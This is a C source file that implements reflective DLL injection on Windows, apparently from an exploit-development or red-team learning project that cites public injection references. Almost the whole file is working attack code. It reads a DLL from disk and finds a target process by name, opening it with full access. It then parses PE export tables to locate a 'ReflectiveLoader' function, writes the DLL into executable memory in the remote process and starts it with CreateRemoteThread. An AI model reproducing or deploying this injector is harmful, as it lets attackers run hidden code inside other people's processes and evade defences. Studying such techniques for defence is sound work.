#include "box.h"

// https://github.com/stephenfewer/ReflectiveDLLInjection/tree/178ba2a6a9feee0a9d9757dcaa65168ced588c12/inject/src
// https://0xninjacyclone.github.io/posts/exploitdev_5_winpe/
// https://trustedsec.com/blog/loading-dlls-reflections

BOOL ReadTargetFile
(
	IN LPCWSTR PeName,
	OUT LPVOID* lpBuffer,
	OUT DWORD* nNumberOfBytesToRead
)

{

	HANDLE hFile = NULL;
	BOOL State = TRUE;
	DWORD lpNumberOfBytesRead = 0;
	DWORD NumberOfBytesToRead = 0;
	LPVOID lppBuffer = NULL;

	if (!PeName || !lpBuffer || !nNumberOfBytesToRead)
		return FALSE;

	if ((hFile = CreateFileW(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current File Handle", hFile);


	if ((NumberOfBytesToRead = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Current File Size", NumberOfBytesToRead);


	if ((lppBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NumberOfBytesToRead)) == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Allocated Bytes to Buffer", NumberOfBytesToRead);


	if (!ReadFile(hFile, lppBuffer, NumberOfBytesToRead, &lpNumberOfBytesRead, NULL)) // lpNumberOfBytesRead can only be NULL if lpOverlapped exists
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Successfully Read File!");

	*lpBuffer = lppBuffer;
	*nNumberOfBytesToRead = NumberOfBytesToRead;

CLEANUP:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

BOOL GetRemoteId
(
	IN LPCWSTR ProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{
	BOOL found = FALSE;
	HANDLE hSnap = NULL;
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(pe32);

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == NULL)
	{
		printf("CreateToolhelp32Snapshot: %lu", GetLastError());
		return FALSE;
	}

	INFO("[0x%p] Acquired Handle to hSnap", hSnap);

	if (Process32FirstW(hSnap, &pe32))
	{
		do
		{
			if (_wcsicmp(pe32.szExeFile, ProcName) == 0)
			{
				*PID = pe32.th32ProcessID;

				*hProcess = OpenProcess(
					PROCESS_ALL_ACCESS,
					FALSE,
					pe32.th32ProcessID
				);

				if (*hProcess == NULL)
				{
					printf("OpenProcess failed: %lu\n", GetLastError());
					CloseHandle(hSnap);
					return FALSE;
				}

				found = TRUE;
				break;
			}

		} while (Process32Next(hSnap, &pe32));
	}

	CloseHandle(hSnap);
	return found;

}

DWORD RvaOffset
(
	IN DWORD dwRva,
	IN UINT_PTR PeBaseAddress
)
{

	PIMAGE_SECTION_HEADER pImgSection	= NULL;
	PIMAGE_NT_HEADERS64 pImgNt			= NULL;


	pImgNt = (PIMAGE_NT_HEADERS64)(PeBaseAddress + ((PIMAGE_DOS_HEADER)PeBaseAddress)->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	pImgSection = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pImgNt->OptionalHeader) + pImgNt->FileHeader.SizeOfOptionalHeader);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		if (dwRva >= pImgSection[i].VirtualAddress && dwRva < (pImgSection[i].VirtualAddress + pImgSection[i].Misc.VirtualSize))
			return (dwRva - pImgSection[i].VirtualAddress + pImgSection[i].PointerToRawData);

	}

	WARN("Couldn't convert RVA to file offset!");

	return 0;

}

DWORD GetReflectiveLdrOffset
(
	IN UINT_PTR ReflectiveLdrBuffer
)
{
	// fancy formatting :)
	PIMAGE_NT_HEADERS64			pImgNt					= NULL;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDir			= NULL;
	PDWORD						pdwFuncNameArray		= NULL;
	PDWORD						pdwFuncAddressArray		= NULL;
	PWORD						pdwFuncOrdinalArray		= NULL;


	pImgNt = (ReflectiveLdrBuffer + ((PIMAGE_DOS_HEADER)ReflectiveLdrBuffer)->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(ReflectiveLdrBuffer + RvaOffset(pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, ReflectiveLdrBuffer));
	pdwFuncNameArray = (PDWORD)(ReflectiveLdrBuffer + RvaOffset(pImgExportDir->AddressOfNames, ReflectiveLdrBuffer));
	pdwFuncAddressArray = (PDWORD)(ReflectiveLdrBuffer + RvaOffset(pImgExportDir->AddressOfFunctions, ReflectiveLdrBuffer));
	pdwFuncOrdinalArray = (PWORD)(ReflectiveLdrBuffer + RvaOffset(pImgExportDir->AddressOfNameOrdinals, ReflectiveLdrBuffer));

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++)
	{

		PCHAR ExportedFunctionName = (PCHAR)(ReflectiveLdrBuffer + RvaOffset(pdwFuncNameArray[i], ReflectiveLdrBuffer));

		if (strcmp(ExportedFunctionName, "ReflectiveLoader") == 0)
		{
			DWORD functionRVA = pdwFuncAddressArray[pdwFuncOrdinalArray[i]];
			DWORD fileOffset = RvaOffset(functionRVA, ReflectiveLdrBuffer);

			return fileOffset;
		}

	}

	WARN("Could Not Resolve Reflective Loader Offset!");
	return 0;

}

BOOL InjectReflectiveDll
(
	IN HANDLE hProcess,
	IN DWORD ReflectiveFunctionOffset,
	IN PBYTE ReflectiveDllBuffer,
	IN DWORD ReflectiveDllSize
)
{

	PBYTE	pBuffer					= NULL;
	SIZE_T	NumberOfBytesWritten	= 0;
	HANDLE	hThread					= NULL;
	DWORD	TID						= 0;


	if (!(pBuffer = VirtualAllocEx(hProcess, NULL, ReflectiveDllSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)))
	{
		PRINT_ERROR("VirtualAllocEx");
		return FALSE;
	}

	INFO("Allocated %zu bytes at --> [0x%p]", ReflectiveDllSize, pBuffer);

	if (!WriteProcessMemory(hProcess, pBuffer, ReflectiveDllBuffer, ReflectiveDllSize, &NumberOfBytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		return FALSE;
	}

	INFO("Wrote %d of %d bytes", NumberOfBytesWritten, ReflectiveDllSize);

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pBuffer + ReflectiveFunctionOffset), pBuffer, 0, &TID)))
	{
		PRINT_ERROR("CreateRemoteThread");
		return FALSE;
	}

	INFO("Executed Reflective Loader!");

	// Debugging

	/*getchar();

	printf("[DEBUG] Thread created with TID: %d\n", TID);

	DWORD waitResult = WaitForSingleObject(hThread, 5000);
	printf("[DEBUG] Wait result: %d\n", waitResult);

	DWORD exitCode;
	if (GetExitCodeThread(hThread, &exitCode))
	{
		printf("[DEBUG] Thread exit code: 0x%X\n", exitCode);
	}*/


	CloseHandle(hThread);

	return TRUE;

}